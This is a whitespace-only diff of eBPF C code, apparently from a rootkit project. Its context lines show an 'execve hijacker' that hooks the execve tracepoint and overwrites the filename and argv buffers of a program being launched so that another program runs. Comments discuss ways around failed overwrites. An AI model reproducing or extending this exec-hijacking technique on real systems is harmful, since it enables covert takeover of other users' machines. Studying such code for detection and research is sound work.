@@ -32,8 +32,8 @@ volatile int hijacker_state = 0;
 
 /**
  * @brief Checks for the error case 2 described in the execve handler when overwriting the filename userspace buffer.
- * 
- * @param ctx 
+ *
+ * @param ctx
  * @return 0 if OK, -1 if error exists
  */
 static __always_inline int test_write_user_unique(struct sys_execve_enter_ctx *ctx, char* org_filename, char* org_argv){
@@ -88,7 +88,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     //Check if the exec hijacker is active already
     char comm[TASK_COMM_LEN] = {0};
     int err = bpf_get_current_comm(comm, sizeof(comm));
-    
+
 
     if(hijacker_state == 1 || EXEC_HIJACK_ACTIVE == 0){
         return 0;
@@ -103,7 +103,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     }
     bpf_printk("Starting execve hijacker\n");
     bpf_printk("EXEC_COMM: %s\n", comm);
-    
+
     char* argv[NUMBER_ARGUMENTS_PARSED] = {0};
     //unsigned char* envp[PROGRAM_LENGTH] = {0};
     char filename[ARGUMENT_LENGTH] = {0};
@@ -150,7 +150,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     2* The call not only overwrites the filename, but also argv[0] with a single write. This may be related to userspace programs using
        the same buffer for both filename and argv[0], since it is the same data in the end. Accordingly, when this event happens both
        the pointers are very close to one another (196 bytes exactly), but not pointing to the same exact location, which is surprising.
-    
+
     Another solution could be to hook do_execve and access the filename struct, which still contians
     an userspace buffer with filename inside. However if we failed to overwrite it before, we will too now.
     Also we can overwrite the return value of the syscall, pass the arguments to the internal ring buffer, read it from the
@@ -187,7 +187,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         bpf_printk("ARGV2: %s\n", argv[2]);
         return -1;
     }
-    
+
     int filename_len = 0;
     for(int ii=0; ii<ARGUMENT_LENGTH; ii++){
         if(filename[ii] == '\0'){
